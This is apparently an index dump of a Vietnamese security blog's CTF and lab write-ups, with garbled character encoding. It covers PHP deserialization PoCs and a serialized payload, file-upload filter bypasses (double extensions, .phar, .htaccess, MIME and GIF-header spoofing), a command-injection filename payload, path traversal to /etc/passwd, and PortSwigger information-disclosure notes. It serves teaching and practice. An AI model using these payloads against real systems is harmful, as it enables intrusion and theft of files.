gi√° tr·ªã l√† m√£ h√≥a base64 chu·ªói serialize c·ªßa ƒë·ªëi t∆∞·ª£ng player v·ª´a t·∫°oFile player.php c√≥ ƒëo·∫°n code khai b√°o class vipPlayer·ªû ƒë√¢y ta ch√∫ √Ω ƒë·∫øn function GetIcon() s·∫Ω tr·∫£ v·ªÅ chu·ªói m√£ h√≥a base64 icon c·ªßa v≈© kh√≠Check file weaporn.phpMagic method __construct() s·∫Ω g√°n ƒë∆∞·ªùng d·∫´n cho thu·ªôc t√≠nh fileIconTrong file start.php c√≥ ƒëo·∫°n code s·∫Ω render ra icon c·ªßa v≈© kh√≠ n·∫øu nh√¢n v·∫≠t c√≥ h√†ng n√≥ngVector khai th√°c: l·ª£i d·ª•ng magic method __construct() c·ªßa class weapon v√† class vipPlayer (v√¨ player kh√¥ng c√≥ h√†ng n√≥ng)POC&lt;?phpdefine('BASE', \"./\");class weapon{\tprivate $fileIcon;\tfunction __construct()\t{\t\t$this-&gt;fileIcon = BASE . \"Fl4g.php\";\t}\tpublic function GetIcon()\t{\t\treturn file_get_contents($this-&gt;fileIcon);\t}\tpublic function GetMaxDamage()\t{\t\treturn 50;\t}}class player{\tprotected $name;\tprotected $maxDamage;\tprotected $health;\tfunction __construct($name)\t{\t\t$this-&gt;name = $name;\t\t$this-&gt;health = 100;\t\t$this-&gt;maxDamage = 10;\t}\tpublic function GetName()\t{\t\treturn $this-&gt;name;\t}\tpublic function GetHealth()\t{\t\treturn $this-&gt;health;\t}\tpublic function SetHealth($health)\t{\t\t$this-&gt;health = $health;\t}\tpublic function attack()\t{\t\treturn rand(0, $this-&gt;maxDamage);\t}\tpublic function HaveWeapon()\t{\t\treturn false;\t}}class vipPlayer extends player{\tprivate $weapon;\tfunction __construct($name)\t{\t\t$this-&gt;name = $name;\t\t$this-&gt;health = 200;\t\t$this-&gt;weapon = new weapon();\t\t$this-&gt;maxDamage = $this-&gt;weapon-&gt;GetMaxDamage();\t}\tpublic function GetIcon()\t{\t\treturn base64_encode($this-&gt;weapon-&gt;GetIcon());\t}\tpublic function HaveWeapon()\t{\t\treturn true;\t}}$a = new vipPlayer(\"a\");echo base64_encode(serialize($a));?&gt;Ta ƒë∆∞·ª£c payloadTzo5OiJ2aXBQbGF5ZXIiOjQ6e3M6MTc6IgB2aXBQbGF5ZXIAd2VhcG9uIjtPOjY6IndlYXBvbiI6MTp7czoxNjoiAHdlYXBvbgBmaWxlSWNvbiI7czoxMDoiLi9GbDRnLnBocCI7fXM6NzoiACoAbmFtZSI7czoxOiJhIjtzOjEyOiIAKgBtYXhEYW1hZ2UiO2k6NTA7czo5OiIAKgBoZWFsdGgiO2k6MjAwO30=Ch·∫∑n b·∫Øt request v·ªõi BurpSuite v√† ƒë·ªïi gi√° tr·ªã cookie hero, c√≥ th·ªÉ th·∫•y player ƒë√£ c√≥ h√†ng n√≥ngCheck ·∫£nh ta c√≥ ƒëo·∫°n m√£ h√≥a base64Decode ƒë∆∞·ª£c flagB√†i n√†y anh Ti·∫øn th∆∞∆°ng c√°c em n√™n ƒë·ªÉ nguy√™n file Payload.php r·ªìi =)) m√¨nh ch·ªâ ph√¢n t√≠chLab4Ta ch√∫ √Ω ƒë·∫øn class getFileSystem c√≥ magic method __wakeup() (t·ª± ƒë·ªông g·ªçi khi unserialize ƒë·ªëi t∆∞·ª£ng) s·∫Ω in ra bi·∫øn $flag trong file flag.phpClass User c√≥ magic method __destruct() s·∫Ω check xem tin nh·∫Øn ng∆∞·ªùi d√πng nh·∫≠p v√†o c√≥ ph·∫£i chu·ªói ‚ÄúBlue7eam‚Äù kh√¥ng, n·∫øu c√≥ s·∫Ω gi·∫£i m√£ base64 chu·ªói username ng∆∞·ªùi d√πng nh·∫≠p v√†o v√† unserialize chu·ªói ƒë√≥Nh∆∞ v·∫≠y, ch·ªâ c·∫ßn nh·∫≠p ƒë√∫ng chu·ªói tin nh·∫Øn ‚ÄúBlue7eam‚Äù v√† username l√† m√£ h√≥a base64 c·ªßa chu·ªói serialize ƒë·ªëi t∆∞·ª£ng thu·ªôc class getFileSystem. Khi ƒë√≥ h√†m __destruct() t·ª± ƒë·ªông g·ªçi khi ch∆∞∆°ng tr√¨nh k·∫øt th√∫c s·∫Ω d·∫´n ƒë·∫øn h√†m __wakeup() c·ªßa class getFileSystem ƒë∆∞·ª£c th·ª±c thi ‚áí in ra flag.POC&lt;?phpclass getFileSystem{ public function __wakeup(){ include('flag.php'); echo $flag; }}$a = new getFileSystem();echo serialize($a);?&gt;Flag" }, { "title": "CyberJutsu Upload File Challenge", "url": "/posts/CyberJutsuUploadFile/", "categories": "Writeup", "tags": "writeup, upload_file", "date": "2022-05-19 12:00:00 +0800", "snippet": "CyberJutsu UploadFileLevel 1Source code c·ªßa level 1&lt;?php error_reporting(0); // Create folder for each user session_start(); $dir = 'upload/' . session_id(); if ( !file_exists($dir) ) mkdir($dir); if(isset($_GET[\"debug\"])) die(highlight_file(__FILE__)); if(isset($_FILES[\"file\"])) { $error = ''; $success = ''; try { $file = $dir . \"/\" . $_FILES[\"file\"][\"name\"]; move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], $file); $success = 'Successfully uploaded file at: &lt;a href=\"/' . $file . '\"&gt;/' . $file . ' &lt;/a&gt;'; } catch(Exception $e) { $error = $e-&gt;getMessage(); } }?&gt;ƒêo·∫°n code tr√™n s·∫Ω th·ª±c hi·ªán t·∫°o m·ªôt ƒë∆∞·ªùng d·∫´n t·∫°m th·ªùi b·∫±ng c√°ch n·ªëi chu·ªói ‚Äúupload‚Äù v·ªõi session id c·ªßa ng∆∞·ªùi d√πng. Bi·∫øn $_FILES l√† m·ªôt bi·∫øn m·∫£ng to√†n c·ª•c c·ªßa PHP, l∆∞u to√†n b·ªô th√¥ng tin v·ªÅ file upload. Sau khi check xem $_FILES[\"file\"] ƒë√£ ƒë∆∞·ª£c kh·ªüi t·∫°o ch∆∞a, ch∆∞∆°ng tr√¨nh s·∫Ω l∆∞u file trong th∆∞ m·ª•c t·∫°m th·ªùi ƒë√£ t·∫°o ·ªü tr√™n v√† ƒë∆∞a ra ƒë∆∞·ªùng link ƒë·∫øn file v·ª´a upload.T·∫°o file test.php v·ªõi n·ªôi dungTh·ª±c hi·ªán upload file test.php, ta th·∫•y trang web b√°o th√†nh c√¥ng v√† tr·∫£ v·ªÅ ƒë∆∞·ªùng link ƒë·∫øn file v·ª´a uploadClick v√†o ƒë∆∞·ªùng link tr√™n, ta th·∫•y file php ƒë∆∞·ª£c th·ª±c thi v√† tr·∫£ v·ªÅ k·∫øt qu·∫£Thay ƒë·ªïi n·ªôi dung file, th·ª±c hi·ªán upload v√† truy c·∫≠p ƒë∆∞·ªùng link, trang web tr·∫£ v·ªÅ k·∫øt qu·∫£ c·ªßa c√¢u l·ªánh whoamiLevel 2Source code c·ªßa level 2:&lt;?php error_reporting(0); // Create folder for each user session_start(); if (!isset($_SESSION['dir'])) { $_SESSION['dir'] = 'upload/' . session_id(); } $dir = $_SESSION['dir']; if ( !file_exists($dir) ) mkdir($dir); if(isset($_GET[\"debug\"])) die(highlight_file(__FILE__)); if(isset($_FILES[\"file\"])) { $error = ''; $success = ''; try { $filename = $_FILES[\"file\"][\"name\"]; $extension = explode(\".\", $filename)[1]; if ($extension === \"php\") { die(\"Hack detected\"); } $file = $dir . \"/\" . $filename; move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], $file); $success = 'Successfully uploaded file at: &lt;a href=\"/' . $file . '\"&gt;/' . $file . ' &lt;/a&gt;'; } catch(Exception $e) { $error = $e-&gt;getMessage(); } }?&gt;ƒêo·∫°n code tr√™n s·∫Ω th·ª±c hi·ªán t√°ch t√™n file b·∫±ng h√†m explode. H√†m explode l√† m·ªôt h√†m x·ª≠ l√Ω chu·ªói trong php, d√πng ƒë·ªÉ t√°ch 1 chu·ªói ƒë∆∞·ª£c ph√¢n t√°ch v·ªõi nhau b·∫±ng 1 k√≠ t·ª± (trong ƒëo·∫°n code tr√™n l√† k√≠ t·ª± \".\" ) v√† tr·∫£ v·ªÅ 1 m·∫£ng nh·ªØng chu·ªói ƒë√£ ƒë∆∞·ª£c ph√¢n t√°ch. V√≠ d·ª•:$a = \"he.llo.wor.ld\";var_dump(explode(\".\",$a));//Return array(4) {// [0]=&gt;// string(2) \"he\"// [1]=&gt;//string(3) \"llo\"//[2]=&gt;//string(3) \"wor\"//[3]=&gt;//string(2) \"ld\"//}Sau khi t√°ch chu·ªói, ch∆∞∆°ng tr√¨nh s·∫Ω check xem chu·ªói ·ªü v·ªã tr√≠ th·ª© 1 trong m·∫£ng c√≥ ph·∫£i .php kh√¥ng, n·∫øu c√≥ s·∫Ω d·ª´ng ch∆∞∆°ng tr√¨nh v√† in ra ‚ÄúHack detected‚ÄùBypass b·∫±ng c√°ch th√™m 1 ƒëu√¥i file n·ªØa v√†o (·ªü ƒë√¢y m√¨nh th√™m ƒëu√¥i .png) , khi n√†y, m·∫£ng $extension s·∫Ω c√≥ gi√° tr·ªã [‚Äùten_file‚Äù,‚Äùpng‚Äù,‚Äùphp‚Äù] v√† bi·∫øn $extension s·∫Ω c√≥ gi√° tr·ªã ‚Äúpng‚ÄùUpload file v√† truy c·∫≠p ƒë∆∞·ªùng d·∫´nTrang web hi·ªÉn th·ªã k·∫øt qu·∫£ c·ªßa c√¢u l·ªánh whoamiLevel 3Source code c·ªßa level 3&lt;?php error_reporting(0); // Create folder for each user session_start(); if (!isset($_SESSION['dir'])) { $_SESSION['dir'] = 'upload/' . session_id(); } $dir = $_SESSION['dir']; if ( !file_exists($dir) ) mkdir($dir); if(isset($_GET[\"debug\"])) die(highlight_file(__FILE__)); if(isset($_FILES[\"file\"])) { $error = ''; $success = ''; try { $filename = $_FILES[\"file\"][\"name\"]; $extension = end(explode(\".\", $filename)); if ($extension === \"php\") { die(\"Hack detected\"); } $file = $dir . \"/\" . $filename; move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], $file); $success = 'Successfully uploaded file at: &lt;a href=\"/' . $file . '\"&gt;/' . $file . ' &lt;/a&gt;'; } catch(Exception $e) { $error = $e-&gt;getMessage(); } }?&gt;ƒêo·∫°n code tr√™n c√≥ ph·∫ßn t∆∞∆°ng t·ª± v·ªõi level 2, nh∆∞ng thay v√¨ l·∫•y ƒëu√¥i file ·ªü v·ªã tr√≠ th·ª© 1 trong m·∫£ng nh∆∞ level 2 th√¨ ch∆∞∆°ng tr√¨nh n√†y s·∫Ω l·∫•y ƒëu√¥i file cu·ªëi c√πngBypass b·∫±ng c√°ch s·ª≠ d·ª•ng ƒëu√¥i .[phar](https://filegi.com/file-info/phar-3781/)Upload file ƒëu√¥i pharTrang web hi·ªÉn th·ªã k·∫øt qu·∫£ c·ªßa c√¢u l·ªánh whoamiLevel 4Source code c·ªßa Level 4&lt;?php error_reporting(0); // Create folder for each user session_start(); if (!isset($_SESSION['dir'])) { $_SESSION['dir'] = 'upload/' . session_id(); } $dir = $_SESSION['dir']; if ( !file_exists($dir) ) mkdir($dir); if(isset($_GET[\"debug\"])) die(highlight_file(__FILE__)); if(isset($_FILES[\"file\"])) { $error = ''; $success = ''; try { $filename = $_FILES[\"file\"][\"name\"]; $extension = end(explode(\".\", $filename)); if (in_array($extension, [\"php\", \"phtml\", \"phar\"])) { die(\"Hack detected\"); } $file = $dir . \"/\" . $filename; move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], $file); $success = 'Successfully uploaded file at: &lt;a href=\"/' . $file . '\"&gt;/' . $file . ' &lt;/a&gt;'; } catch(Exception $e) { $error = $e-&gt;getMessage(); } }?&gt;Level n√†y trang web s·ª≠ d·ª•ng blacklist, n·∫øu ƒë∆∞·ªùng d·∫´n c·ªßa file l√† php, phtml, phar th√¨ ch∆∞∆°ng tr√¨nh s·∫Ω d·ª´ng v√† in ra d√≤ng ch·ªØ ‚ÄúHack detected‚ÄùBypass b·∫±ng c√°ch ghi ƒë√® file .htaccessUpload file .htaccess v·ª´a t·∫°oƒê·ªïi ƒëu√¥i file sang php2 v√† ti·∫øn h√†nh upload fileTrang web hi·ªÉn th·ªã k·∫øt qu·∫£ c√¢u l·ªánh whoamiLevel 5Source code level 5:&lt;?php error_reporting(0); // Create folder for each user session_start(); if (!isset($_SESSION['dir'])) { $_SESSION['dir'] = 'upload/' . session_id(); } $dir = $_SESSION['dir']; if ( !file_exists($dir) ) mkdir($dir); if(isset($_GET[\"debug\"])) die(highlight_file(__FILE__)); if(isset($_FILES[\"file\"])) { $error = ''; $success = ''; try { $mime_type = $_FILES[\"file\"][\"type\"]; if (!in_array($mime_type, [\"image/jpeg\", \"image/png\", \"image/gif\"])) { die(\"Hack detected\"); } $file = $dir . \"/\" . $_FILES[\"file\"][\"name\"]; move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], $file); $success = 'Successfully uploaded file at: &lt;a href=\"/' . $file . '\"&gt;/' . $file . ' &lt;/a&gt;'; } catch(Exception $e) { $error = $e-&gt;getMessage(); } }?&gt;ƒêo·∫°n code th·ª±c hi·ªán check MIME type c·ªßa file ƒë∆∞·ª£c upload l√™n, n·∫øu kh√¥ng l√† 1 trong 3 ki·ªÉu \"image/jpeg\", \"image/png\", \"image/gif\" th√¨ ch∆∞∆°ng tr√¨nh s·∫Ω d·ª´ng v√† in ra m√†n h√¨nh chu·ªói ‚ÄúHack detected‚ÄùS·ª≠ d·ª•ng Burp Suite ƒë·ªÉ b·∫Øt POST request upload fileCh·ªânh s·ª≠a Content-Type th√†nh image/gif v√† g·ª≠i l·∫°i request, ta th·∫•y trang web th√¥ng b√°o upload th√†nh c√¥ngTruy c·∫≠p url ch·ª©a file ƒë√£ uploadLevel 6Soure code level 6:&lt;?php // Create folder for each user session_start(); $dir = 'upload/' . session_id(); if ( !file_exists($dir) ) mkdir($dir); $error = ''; $success = ''; if(isset($_GET[\"debug\"])) die(highlight_file(__FILE__)); if(isset($_FILES[\"file\"])) { try { $finfo = finfo_open(FILEINFO_MIME_TYPE); $mime_type = finfo_file($finfo, $_FILES['file']['tmp_name']); $whitelist = array(\"image/jpeg\", \"image/png\", \"image/gif\"); if (!in_array($mime_type, $whitelist, TRUE)) { die(\"Hack detected\"); } $file = $dir . \"/\" . $_FILES[\"file\"][\"name\"]; move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], $file); $success = 'Successfully uploaded file at: &lt;a href=\"/' . $file . '\"&gt;/' . $file . ' &lt;/a&gt;'; } catch(Exception $e) { $error = $e-&gt;getMessage(); } }?&gt;ƒêo·∫°n code s·ª≠ d·ª•ng h√†m finfo_file ƒë·ªÉ l·∫•y MIME type c·ªßa file, sau ƒë√≥ check xem c√≥ trong whitelist ƒë√£ ƒë∆∞·ª£c khai b√°o tr∆∞·ªõc kh√¥ng, n·∫øu kh√¥ng c√≥ trong whitelist ƒë·ªãnh tr∆∞·ªõc ch∆∞∆°ng tr√¨nh s·∫Ω d·ª´ng v√† in ra chu·ªói ‚ÄúHack detected‚ÄùBypass b·∫±ng c√°ch th√™m header c·ªßa file gif v√†o tr∆∞·ªõc ƒëo·∫°n code phpBypass v√† upload file th√†nh c√¥ngTruy c·∫≠p url c·ªßa file ƒë√£ uploadLevel 7·ªû level n√†y, trang web cho ph√©p ng∆∞·ªùi d√πng upload 1 file n√©n, ph√≠a backend c·ªßa trang web s·∫Ω unzip (gi·∫£i n√©n) v√† l∆∞u v√†o folder cho ng∆∞·ªùi d√πngTi·∫øn h√†nh upload th·ª≠ m·ªôt fileM√¨nh ch√∫ √Ω ƒë·∫øn c√¢u l·ªánh ƒë·ªÉ unzip file ƒë∆∞·ª£c in ph√≠a d∆∞·ªõi, t√™n file s·∫Ω ƒë∆∞·ª£c ƒë∆∞a v√†o m·ªôt c√¢u l·ªánh ƒë·ªÉ gi·∫£i n√©n file, v√† t√™n file l√† do ph√≠a ng∆∞·ªùi d√πng cung c·∫•p n√™n ch√∫ng ta c√≥ th·ªÉ ch·ªânh s·ª≠a t√™n file ƒë·ªÉ khai th√°c l·ªó h·ªïng OS Command InjectionUnzipper command: unzip /usr/upload/616609e23f10f16ea1ff8e114b4974c3/e66ea8344f034964ba0b3cb9879996ff.tar -d /usr/upload/616609e23f10f16ea1ff8e114b4974c3Th·ª±c hi·ªán b·∫Øt post request upload file v√† ch·ªânh s·ª≠a t√™n file th√†nh ten_file &amp; &lt;command&gt; &amp; .Payload &amp; &lt;command&gt; &amp; v·ªõi &amp; l√† m·ªôt to√°n t·ª≠ c√¢u l·ªánh trong linux v·ªõi m·ª•c ƒë√≠ch ch·∫°y ng·∫ßm 1 c√¢u l·ªánh. Thay command = echo hell, ta th·∫•y trang web tr·∫£ v·ªÅ chu·ªói ‚Äúhell‚ÄùThay command th√†nh whoami , trang web tr·∫£ v·ªÅ www-dataLevel 8&lt;?php error_reporting(0); if (!isset($_GET['game'])) { header('Location: /?game=fatty-bird-1.html'); } $game = $_GET['game']; if(isset($_GET[\"debug\"])) die(highlight_file(__FILE__));?&gt;&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt; &lt;head&gt; &lt;?php include './views/header.html'; ?&gt; &lt;/head&gt; &lt;body&gt; &lt;nav class=\"navbar navbar-expand-lg navbar-light bg-light\"&gt; &lt;a href=\"?game=fatty-bird-1.html&amp;debug\"&gt;Debug source&lt;/a&gt; &lt;/nav&gt; &lt;br&gt;&lt;br&gt; &lt;h3 class=\"display-4 text-center\"&gt;File upload workshop&lt;/h3&gt; &lt;h4 class=\"display-4 text-center\"&gt;Level 8&lt;/h4&gt; &lt;p class=\"display-5 text-center\"&gt;Goal: read /etc/passwd&lt;/p&gt; &lt;br&gt; &lt;div style=\"background-color: white; padding: 20px;\"&gt; &lt;?php include './views/' . $game; ?&gt; &lt;/div&gt; &lt;/body&gt; &lt;?php include './views/footer.html' ?&gt;&lt;/html&gt;ƒêo·∫°n code tr√™n th·ª±c hi·ªán l·∫•y GET parameter ‚Äúgame‚Äù v√† truy·ªÅn v√†o ph·∫ßn d∆∞·ªõi c·ªßa trang web: &lt;?php include './views/' . $game; ?&gt;ƒê√¢y l√† l·ªói Path Traversal, nh∆∞ quan s√°t th·∫•y, ch√∫ng ta ƒëang ·ªü th∆∞ m·ª•c views, l√† th∆∞ m·ª•c con c·ªßa /var/www/html/ (Th∆∞ m·ª•c default c·ªßa apache) v√¨ v·∫≠y c·∫ßn s·ª≠ d·ª•ng 4 l·∫ßn ../ ƒë·ªÉ v·ªÅ th∆∞ m·ª•c g·ªëc c·ªßa h·ªá ƒëi·ªÅu h√†nh, sau ƒë√≥ truy c·∫≠p /etc/passwdPayload: ../../../../etc/passwdLevel 9Source code c·ªßa ph·∫ßn game:T∆∞∆°ng t·ª± nh∆∞ lv 8, lv 9 c≈©ng d√≠nh l·ªói Path TraversalTrang Profile c√≥ ch·ª©c nƒÉng upload avatar ng∆∞·ªùi ch∆°iUpload file hehe.php v·ªõi n·ªôi dungTa th·∫•y trang web kh√¥ng h·ªÅ filter file phpTruy c·∫≠p file avatar t·ª´ trang Hall of fame, ta th·∫•y t√™n file ƒë√£ ƒë∆∞·ª£c ƒë·ªïi th√†nh avatar.jpg v√† code php kh√¥ng ƒë∆∞·ª£c th·ª±c thiCheck file source code c·ªßa trang profile, ta th·∫•y ƒë∆∞·ªùng d·∫´n l∆∞u file avatar do ng∆∞·ªùi d√πng upload l√™n l√† /usr/uploadS·ª≠ d·ª•ng Path Traversal ƒë·ªÉ truy c·∫≠p ƒë·∫øn avatar c·ªßa b·∫£n th√¢n, ta th·∫•y c√¢u l·ªánh whoami ƒë∆∞·ª£c th·ª±c thi v√† in ra k·∫øt qu·∫£Shout out to CyberJutsu v√¨ challenge ch·∫•t l∆∞·ª£ng ‚ù§Ô∏è" }, { "title": "DCTF22 - Seek", "url": "/posts/DCTF22Seek/", "categories": "Writeup, DCTF22", "tags": "web, writeup", "date": "2022-04-19 21:00:00 +0800", "snippet": "SeekFile seek.c#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int oops(){ printf(\"oops this wasn't the char I was looking for\\n\"); exit(1); return 0;}int main () { FILE *fp; char c; fp = fopen(\"flag.txt\",\"r\"); if (fp==NULL) { printf(\"error opening file\\n\"); exit(1); } fseek(fp,540,SEEK_SET);c=fgetc(fp);if(c != 32){oops();}fseek(fp,711,SEEK_SET);c=fgetc(fp);if(c != 32){oops();}fseek(fp,73,SEEK_SET);c=fgetc(fp);if(c != 95){oops();}fseek(fp,68,SEEK_SET);c=fgetc(fp);if(c != 95){oops();}fseek(fp,155,SEEK_SET);c=fgetc(fp);if(c != 95){oops();}.....fseek(fp,433,SEEK_SET);c=fgetc(fp);if(c != 46){oops();} printf(\"CORRECT!\\n\"); fclose(fp); return(0);}File seek.c full: https://drive.google.com/file/d/11T-2a3gX5nmZHI-CPcSKSjcVJA9OVe_q/view?usp=sharingFile flag.txt l√† file tr·ªëngReview code file seek.cH√†m oops() s·∫Ω in ra 1 chu·ªói v√† k·∫øt th√∫c ch∆∞∆°ng tr√¨nhTrong h√†m main khai b√°o bi·∫øn k√≠ t·ª± c v√† con tr·ªè fileƒêo·∫°n code ti·∫øp theo, m·ªói d√≤ng l·ªánh s·∫Ω th·ª±c hi·ªán 3 vi·ªác Nh·∫£y con tr·ªè ƒë·∫øn 1 v·ªã tr√≠ n√†o ƒë√≥ trong file L·∫•y ra k√≠ t·ª± ·ªü v·ªã tr√≠ con tr·ªè file fp ƒëang tr·ªè ƒë·∫øn So s√°nh v·ªõi 1 k√≠ t·ª± ƒë·ªãnh tr∆∞·ªõc, n·∫øu kh√¥ng gi·ªëng nhau s·∫Ω th·ª±c hi·ªán h√†m oops() (tho√°t ch∆∞∆°ng tr√¨nh)H∆∞·ªõng gi·∫£i: Ghi v√†o file t·ª´ng k√≠ t·ª± m√† c√¢u l·ªánh if ƒëang so s√°nhCh·ªânh s·ª≠a l·∫°i h√†m oops ƒë·ªÉ n√≥ v·∫Ω ra c·ªù :^V·ªõi m·ªói c√¢u l·ªánh g·ªçi h√†m oops(), thay th·∫ø b·∫±ng fputs(oops(),fp);" }, { "title": "Information Disclosure Labs", "url": "/posts/In4DisclosureLabs/", "categories": "Blog, PortSwigger", "tags": "information_disclosure", "date": "2022-03-31 21:00:00 +0800", "snippet": "Information Disclosure LabsLab: Information disclosure in error messagesGiao di·ªán trang webTa th·∫•y trang web s·ª≠ d·ª•ng GET request v·ªõi parameter productId=2 ƒë·ªÉ truy xu·∫•t th√¥ng tin chi ti·∫øt c·ªßa m·ªôt s·∫£n ph·∫©mTh·ª≠ thay th·∫ø gi√° tr·ªã h·ª£p l·ªá th√†nh m·ªôt gi√° tr·ªã v·ªõi ki·ªÉu d·ªØ li·ªáu kh√°cTa th·∫•y trang web tr·∫£ l·∫°i th√¥ng b√°o l·ªói k√®m c·∫£ vesion c·ªßa apache cho ch·∫Øc ch·∫Øn :^Lab: Information disclosure on debug pageL·∫ßn n√†y, ch√∫ng ta c·∫ßn l·∫•y ƒë∆∞·ª£c SECRET_KEYCheck qua source code c·ªßa trang web, ta th·∫•y 1 comment, h√†ng v·ªÅ h√†ng v·ªÅTruy c·∫≠p url v√† t√¨m ƒë∆∞·ª£c SECRET_KEYLab: Source code disclosure via backup filesCheck file robots.txtTruy c·∫≠p /backupTa c√≥ file backup ProductTemplate.javaPass c·ªßa db ƒë∆∞·ª£c hard code trong fileLab: Authentication bypass via information disclosureƒêang c·∫≠p nh·∫≠t. . ." }, { "title": "Information disclosure vulnerabilities", "url": "/posts/In4Disclosure/", "categories": "Blog, PortSwigger", "tags": "portswigger, information_disclosure", "date": "2022-03-31 12:00:00 +0800", "snippet": "Information disclosure vulnerabilitiesInfromation disclosure l√† g√¨ Th√¥ng tin b·ªã ti·∫øt l·ªô hay r√≤ r·ªâ khi website v√¥ t√¨nh ti·∫øt l·ªô th√¥ng tin nh·∫°y c·∫£m cho ng∆∞·ªùi d√πng T√πy v√†o ho√†n c·∫£nh, trang web c√≥ th·ªÉ ƒë·ªÉ l·ªô nhi·ªÅu lo·∫°i th√¥ng tin, bao g·ªìm D·ªØ li·ªáu v·ªÅ c√°c ng∆∞·ªùi d√πng kh√°c (username, th√¥ng tin t√†i ch√≠nh,. . .) D·ªØ li·ªáu kinh doanh ho·∫∑c th∆∞∆°ng m·∫°i Chi ti·∫øt v·ªÅ c√¥ng ngh·ªá, kƒ© thu·∫≠t ƒë∆∞·ª£c s·ª≠ d·ª•ng tr√™n trang web v√† c∆° s·ªü h·∫° t·∫ßng c·ªßa n√≥ M·ªôt v√†i v√≠ d·ª• v·ªÅ Information Disclosure Ti·∫øt l·ªô t√™n c·ªßa c√°c th∆∞ m·ª•c ·∫©n, c·∫•u tr√∫c v√† n·ªôi dung c·ªßa ch√∫ng t·ª´ file robots.txt ho·∫∑c danh s√°ch th∆∞ m·ª•c Cung c·∫•p quy·ªÅn truy c·∫≠p v√†o source code th√¥ng qua c√°c b·∫£n sao l∆∞u t·∫°m th·ªùi (temporary backups) ƒê·ªÅ c·∫≠p ƒë·∫øn t√™n b·∫£ng ho·∫∑c t√™n c·ªôt trong databases trong th√¥ng b√°o l·ªói Hard code API keys, ƒë·ªãa ch·ªâ IP, th√¥ng tin ƒëƒÉng nh·∫≠p databases trong source code G·ª£i √Ω v·ªÅ s·ª± t·ªìn t·∫°i ho·∫∑c kh√¥ng c·ªßa t√†i nguy√™n, t√™n ng∆∞·ªùi d√πng, v.v. th√¥ng qua s·ª± kh√°c bi·ªát nh·ªè trong th√¥ng b√°o, ph·∫£n h·ªìi c·ªßa ·ª©ng d·ª•ng. V√≠ d·ª• th·ª±c t·∫ø ·ªü d∆∞·ªõi =)))C√°ch m√† l·ªó h·ªïng ch√≠t t·ªãt n√†y ph√°t sinh ? Qu√™n x√≥a n·ªôi dung n·ªôi b·ªô kh·ªèi n·ªôi dung c√¥ng khai. V√≠ d·ª•: Comment c·ªßa dev c√≥ th·ªÉ hi·ªÉn th·ªã cho ng∆∞·ªùi d√πng C·∫•u h√¨nh thi·∫øu ho·∫∑c c·∫•u h√¨nh sai trang web v√† c√°c c√¥ng ngh·ªá li√™n quan. V√≠ d·ª•: Kh√¥ng t·∫Øt t√≠nh nƒÉng debug : D L·ªó h·ªïng trong thi·∫øt k·∫ø v√† ph√°t tri·ªÉn ph·∫ßn m·ªÅm: V√≠ d·ª•: Tr·∫£ v·ªÅ th√¥ng b√°o l·ªói kh√°c nhau cho ch·ª©c nƒÉng ƒëƒÉng nh·∫≠p: ‚ÄúSai t√™n ƒëƒÉng nh·∫≠p‚Äù v√† ‚ÄúSai m·∫≠t kh·∫©u‚Äù thay v√¨ ‚ÄúT√™n ƒëƒÉng nh·∫≠p HO·∫∂C m·∫≠t kh·∫©u sai‚Äù·∫¢nh h∆∞·ªüng c·ªßa l·ªó h·ªïng n√†y ? L·ªó h·ªïng c√≥ th·ªÉ t√°c ƒë·ªông tr·ª±c ti·∫øp v√† gi√°n ti·∫øp ƒë·∫øn trang web t√πy thu·ªôc v√†o m·ª•c ƒë√≠ch c·ªßa trang web, k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ thu th·∫≠p ƒë∆∞·ª£c th√¥ng tin n√†o ƒë√≥ Trong m·ªôt s·ªë tr∆∞·ªùng h·ª£p, ch·ªâ ri√™ng vi·ªác ti·∫øt l·ªô th√¥ng tin nh·∫°y c·∫£m c≈©ng g√¢y ·∫£nh h∆∞·ªüng nghi√™m tr·ªçng. V√≠ d·ª•: M·ªôt trang web th∆∞∆°ng m·∫°i ƒëi·ªán t·ª≠ l√†m l·ªô d·ªØ li·ªáu th·∫ª t√≠n d·ª•ng c·ªßa kh√°ch h√†ng, ‚Ä¶ M·∫∑t kh√°c, th√¥ng tin kƒ© thu·∫≠t b·ªã r√≤ r·ªâ nh∆∞ c·∫•u tr√∫c th∆∞ m·ª•c, th√¥ng tin v·ªÅ c√°c c√¥ng ngh·ªá, framework ƒëang ƒë∆∞·ª£c s·ª≠ d·ª•ng c√≥ th·ªÉ l√† th√¥ng tin quan tr·ªçng, m·ªôt ‚Äúm·∫£nh gh√©p c√≤n thi·∫øu‚Äù ƒë·ªÉ k·∫ª t·∫•n c√¥ng t·∫≠n d·ª•ng, ho√†n thi·ªán k·ªãch b·∫£n t·∫•n c√¥ng ho·∫∑c m·ªü ra nhi·ªÅu attack vector (h∆∞·ªõng t·∫•n c√¥ng) kh√°c. Trong tr∆∞·ªùng h·ª£p n√†y, m·ª©c ƒë·ªô nghi√™m tr·ªçng c·ªßa l·ªó h·ªïng ph·ª• thu·ªôc v√†o nh·ªØng g√¨ m√† k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ l√†m v·ªõi th√¥ng tin b·ªã r√≤ r·ªâ ( v·ªõi m√¨nh th√¨ ch·∫Øc v√¥ d·ª•ng =))) )C√°ch khai th√°c l·ªó h·ªïng Information DisclosurePh·∫ßn n√†y kh√° d√†i n√™n c√≥ l·∫Ω m√¨nh s·∫Ω vi·∫øt trong b√†i ti·∫øp theoNgƒÉn ch·∫∑n/kh·∫Øc ph·ª•c l·ªó h·ªïng n√†y?Vi·ªác ngƒÉn ch·∫∑n ho√†n to√†n l·ªó h·ªïng n√†y l√† m·ªôt vi·ªác kh√≥ khƒÉn do c√≥ n√≥ c√≥ th·ªÉ ph√°t sinh theo nhi·ªÅu c√°ch kh√°c nhau. D√π v·∫≠y, ch√∫ng ta ho√†n to√†n c√≥ th·ªÉ s·ª≠ d·ª•ng nh·ªØng c√°ch sau ƒë√¢y ƒë·ªÉ h·∫°n ch·∫ø ƒë∆∞·ª£c l·ªó h·ªïng Information Disclosure: ƒê·∫ßu ti√™n l√† con ng∆∞·ªùi ( L·ªó h·ªïng l·ªõn nh·∫•t c·ªßa 